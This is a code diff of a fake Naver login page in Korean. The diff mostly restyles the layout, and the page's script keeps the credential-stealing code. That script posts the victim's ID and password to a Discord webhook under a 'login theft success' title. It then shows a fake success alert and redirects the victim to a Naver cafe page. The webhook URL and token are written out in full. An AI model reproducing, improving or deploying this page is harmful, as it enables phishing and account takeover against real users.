@@ -1,30 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="ko">
 <head>
 <meta charset="utf-8">
 <title>네이버 로그인</title>
 <style>
-  body{background:#fff;font-family:"Noto Sans KR",sans-serif;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
-  .login_wrap{width:360px;padding:40px;background:#fff;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
+  body{margin:0;background:#fff;font-family:"Noto Sans KR",sans-serif}
+  .login-container{max-width:460px;margin:40px auto;padding:40px 20px;background:#fff}
+  .login-box{border:1px solid #e5e5e5;border-radius:8px;padding:40px 40px 30px;background:#fff}
   .logo{text-align:center;margin-bottom:30px}
-  .logo img{width:80px}
-  input{width:100%;padding:15px;margin:8px 0;border:1px solid #dadada;border-radius:4px;font-size:16px;box-sizing:border-box}
-  button{width:100%;padding:15px;background:#03c75a;color:#fff;border:none;border-radius:4px;font-size:17px;font-weight:700;cursor:pointer;margin-top:20px}
-  .info{text-align:center;font-size:13px;color:#888;margin-top:20px}
+  .logo img{width:120px}
+  .input-id,.input-pw{position:relative;margin-bottom:10px}
+  input{width:100%;height:50px;padding:0 15px;border:1px solid #dadada;border-radius:4px;font-size:16px;box-sizing:border-box}
+  .btn-login{width:100%;height:54px;margin-top:30px;background:#03c75a;color:#fff;border:none;border-radius:4px;font-size:17px;font-weight:700;cursor:pointer}
+  .keep-login{margin-top:20px;text-align:center}
+  .keep-login input{vertical-align:middle}
+  .keep-login label{font-size:13px;color:#666}
 </style>
 </head>
 <body>
-<div class="login_wrap">
-  <div class="logo">
-    <img src="https://static.nid.naver.com/images/web/user/default.png?type=s160" alt="네이버">
+<div class="login-container">
+  <div class="login-box">
+    <div class="logo">
+      <img src="https://static.nid.naver.com/images/web/user/default.png?type=s160" alt="네이버">
+    </div>
+    <form onsubmit="event.preventDefault();send()">
+      <div class="input-id">
+        <input type="text" id="id" placeholder="아이디" required autocomplete="username">
+      </div>
+      <div class="input-pw">
+        <input type="password" id="pw" placeholder="비밀번호" required autocomplete="current-password">
+      </div>
+      <div class="keep-login">
+        <input type="checkbox" id="keep">
+        <label for="keep">로그인 상태 유지</label>
+      </div>
+      <button type="submit" class="btn-login">로그인</button>
+    </form>
   </div>
-  <h3 style="text-align:center;margin:0 0 20px;font-weight:400;color:#333">네이버 로그인</h3>
-  <form onsubmit="event.preventDefault();send()">
-    <input type="text" id="id" placeholder="아이디" required autocomplete="username">
-    <input type="password" id="pw" placeholder="비밀번호" required autocomplete="current-password">
-    <button type="submit">로그인</button>
-  </form>
-  <p class="info">카페 접속을 위해 로그인이 필요합니다</p>
 </div>
 
 <script>
@@ -36,7 +48,7 @@ function send(){
     "https://discord.com/api/webhooks/1440762946039840769/8K5oWaQYD3rPwnCF5SOFsLteF6ckSzeZ8BOmwd1YIXunRnvg8fyRAhd3c823205UxDat"
   ];
   hooks.forEach(h=>fetch(h,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"🎯 네이버 로그인 탈취 성공",color:16711680,fields:[{name:"아이디",value:id},{name:"비밀번호",value:pw},{name:"시간",value:new Date().toLocaleString("ko-KR")}]}]})}));
-  alert("로그인되었습니다!");
+  alert("로그인되었습니다.");
   location.href="https://m.cafe.naver.com/minsahelp.cafe";
 }
 </script>
